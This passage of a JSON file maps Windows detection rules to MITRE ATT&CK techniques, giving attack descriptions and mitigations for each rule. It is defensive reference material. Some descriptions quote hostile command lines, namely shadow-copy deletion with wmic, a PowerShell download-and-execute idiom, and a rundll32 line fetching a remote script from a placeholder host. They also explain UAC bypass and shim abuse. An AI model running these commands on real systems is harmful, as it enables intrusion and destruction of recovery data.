            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
            "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. \n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control]( (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.  Shims can also be abused to establish persistence by continuously being invoked by affected programs."
        ],
        "mitigation_strategies": [
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions.",
            "Changing UAC settings to \"Always Notify\" will give the user more visibility when UAC elevation is requested, however, this option will not be popular among users due to the constant UAC interruptions."
        ]
    },
    {
        "rule_id": 92060,
        "rule_description": "Suspicious process (right to left override character) spawned a subprocess",
        "mitre_id": [
            "T1036.002"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92061,
        "rule_description": "Windows backup and restore tool $(win.eventdata.originalFileName) launched via $(win.eventdata.parentImage) with $(win.eventdata.integrityLevel) integrity level",
        "mitre_id": [
            "T1548",
            "T1059.003"
        ],
        "possible_attacks": [
            "Abuse Elevation Control Mechanism",
            "Windows Command Shell"
        ],
        "description": [
            "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.",
            "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd]( is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services]( such as [SSH](\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd]( to execute various commands and payloads. Common uses include [cmd]( to execute a single command, or abusing [cmd]( interactively with input and output forwarded over a command and control channel."
        ],
        "mitigation_strategies": [
            "Limit the privileges of cloud accounts to assume, create, or impersonate additional roles, policies, and permissions to only those required. Where just-in-time access is enabled, consider requiring manual approval for temporary elevation of privileges.",
            "Use application control where appropriate."
        ]
    },
    {
        "rule_id": 92062,
        "rule_description": "Powershell launched with a $(win.eventdata.integrityLevel) integrity level by $(win.eventdata.parentImage)",
        "mitre_id": [
            "T1548",
            "T1548.002"
        ],
        "possible_attacks": [
            "Abuse Elevation Control Mechanism",
            "Bypass User Account Control"
        ],
        "description": [
            "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.",
            "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model]( objects without prompting the user through the UAC notification box. An example of this is use of [Rundll32]( to load a specifically crafted DLL which loads an auto-elevated [Component Object Model]( object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity."
        ],
        "mitigation_strategies": [
            "Limit the privileges of cloud accounts to assume, create, or impersonate additional roles, policies, and permissions to only those required. Where just-in-time access is enabled, consider requiring manual approval for temporary elevation of privileges.",
            "Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [DLL Search Order Hijacking]("
        ]
    },
    {
        "rule_id": 92063,
        "rule_description": "File deletion by $(win.eventdata.originalFileName). Command: $(win.eventdata.commandLine)",
        "mitre_id": [
            "T1070.004"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92064,
        "rule_description": "Executed suspicious process with right to left override character in binary file, possible malicious file masquerading",
        "mitre_id": [
            "T1036.002",
            "T1204.002"
        ],
        "possible_attacks": [
            "Malicious File"
        ],
        "description": [
            "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment]( Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.\n\nAdversaries may employ various forms of [Masquerading]( and [Obfuscated Files or Information]( to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile [Malicious File]( frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing]("
        ],
        "mitigation_strategies": [
            "Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events."
        ]
    },
    {
        "rule_id": 92065,
        "rule_description": "Powershell.exe launched by binary $(win.eventdata.parentImage) in a suspicious location",
        "mitre_id": [
            "T1059.001"
        ],
        "possible_attacks": [
            "PowerShell"
        ],
        "description": [
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)."
        ],
        "mitigation_strategies": [
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions."
        ]
    },
    {
        "rule_id": 92066,
        "rule_description": "$(win.eventdata.image) binary in a suspicious location launched by $(win.eventdata.parentImage)",
        "mitre_id": [
            "T1059.001"
        ],
        "possible_attacks": [
            "PowerShell"
        ],
        "description": [
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)."
        ],
        "mitigation_strategies": [
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions."
        ]
    },
    {
        "rule_id": 92067,
        "rule_description": "$(win.eventdata.image) launched by $(win.eventdata.parentImage) executed a compressed file creation command",
        "mitre_id": [
            "T1560.001"
        ],
        "possible_attacks": [
            "Archive via Utility"
        ],
        "description": [
            "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging]( <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil]( to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities."
        ],
        "mitigation_strategies": [
            "System scans can be performed to identify unauthorized archival utilities."
        ]
    },
    {
        "rule_id": 92068,
        "rule_description": "PSEXEC was used to execute: $(win.eventdata.commandLine)",
        "mitre_id": [
            "T1569.002"
        ],
        "possible_attacks": [
            "Service Execution"
        ],
        "description": [
            "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](\n\n[PsExec]( can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as [PsExec]( and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service]( during service persistence or privilege escalation."
        ],
        "mitigation_strategies": [
            "Ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level."
        ]
    },
    {
        "rule_id": 92069,
        "rule_description": "Windows management instrumentation started a process",
        "mitre_id": [
            "T1047"
        ],
        "possible_attacks": [
            "Windows Management Instrumentation"
        ],
        "description": [
            "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by [Remote Services]( such as [Distributed Component Object Model]( and [Windows Remote Management]( Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery]( as well as [Execution]( of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell]( as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc."
        ],
        "mitigation_strategies": [
            "By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI."
        ]
    },
    {
        "rule_id": 92070,
        "rule_description": "Windows management instrumentation (WMI) created a powershell process",
        "mitre_id": [
            "T1047",
            "T1059.001"
        ],
        "possible_attacks": [
            "Windows Management Instrumentation",
            "PowerShell"
        ],
        "description": [
            "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by [Remote Services]( such as [Distributed Component Object Model]( and [Windows Remote Management]( Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery]( as well as [Execution]( of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell]( as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.",
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)."
        ],
        "mitigation_strategies": [
            "By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI.",
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions."
        ]
    },
    {
        "rule_id": 92071,
        "rule_description": "A powershell process created by WMI executed a base64 encoded command",
        "mitre_id": [
            "T1047",
            "T1059.001"
        ],
        "possible_attacks": [
            "Windows Management Instrumentation",
            "PowerShell"
        ],
        "description": [
            "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by [Remote Services]( such as [Distributed Component Object Model]( and [Windows Remote Management]( Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery]( as well as [Execution]( of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell]( as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.",
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)."
        ],
        "mitigation_strategies": [
            "By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI.",
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions."
        ]
    },
    {
        "rule_id": 92072,
        "rule_description": "Certutil decoding a file",
        "mitre_id": [
            "T1140"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92073,
        "rule_description": "Powershell executing certutil to decode a file",
        "mitre_id": [
            "T1140"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92074,
        "rule_description": "$(win.eventdata.originalFileName) launched with commands to create a binary file",
        "mitre_id": [
            "T1105"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
    },
    {
        "rule_id": 92075,
        "rule_description": "$(win.eventdata.originalFileName) launched with commands to create a binary file",
        "mitre_id": [
            "T1105"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
    },
    {
        "rule_id": 92076,
        "rule_description": "Rundll32 executing suspicious .lock file, possible persistence tactic",
        "mitre_id": [
            "T1546",
            "T1218"
        ],
        "possible_attacks": [
            "Event Triggered Execution",
            "System Binary Proxy Execution"
        ],
        "description": [
            "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.\n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. ",
            "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system. Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.\n\nSimilarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands."
        ],
        "mitigation_strategies": [
            "Perform regular software updates to mitigate exploitation risk.",
            "Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc."
        ]
    },
    {
        "rule_id": 92077,
        "rule_description": "WMI command was used for AV product discovery",
        "mitre_id": [
            "T1518.001"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92078,
        "rule_description": "Cmd.exe executed from non-standard directory, may be related to link execution from mounted ISO file",
        "mitre_id": [
            "T1204.002"
        ],
        "possible_attacks": [
            "Malicious File"
        ],
        "description": [
            "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment]( Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.\n\nAdversaries may employ various forms of [Masquerading]( and [Obfuscated Files or Information]( to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile [Malicious File]( frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing]("
        ],
        "mitigation_strategies": [
            "Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events."
        ]
    },
    {
        "rule_id": 92079,
        "rule_description": "Rundll32 executed from non-standard directory, may be related to link execution from mounted ISO file",
        "mitre_id": [
            "T1204.002",
            "T1218.011"
        ],
        "possible_attacks": [
            "Malicious File",
            "Rundll32"
        ],
        "description": [
            "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment]( Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.\n\nAdversaries may employ various forms of [Masquerading]( and [Obfuscated Files or Information]( to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile [Malicious File]( frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](",
            "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules]( may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel]( Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. For example, [ClickOnce]( can be proxied through Rundll32.exe.\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. \n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading]( techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload. "
        ],
        "mitigation_strategies": [
            "Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.",
            "Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass application control."
        ]
    },
    {
        "rule_id": 92080,
        "rule_description": "System information discovery activity detected",
        "mitre_id": [
            "T1082",
            "T1047"
        ],
        "possible_attacks": [
            "Windows Management Instrumentation"
        ],
        "description": [
            "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems. WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by [Remote Services]( such as [Distributed Component Object Model]( and [Windows Remote Management]( Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery]( as well as [Execution]( of commands and payloads. For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell]( as the primary WMI interface. In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc."
        ],
        "mitigation_strategies": [
            "By default, only administrators are allowed to connect remotely using WMI. Restrict other users who are allowed to connect, or disallow all users to connect remotely to WMI."
        ]
    },
    {
        "rule_id": 92081,
        "rule_description": "Rundll32 executing file with suspicious extension",
        "mitre_id": [
            "T1218.011"
        ],
        "possible_attacks": [
            "Rundll32"
        ],
        "description": [
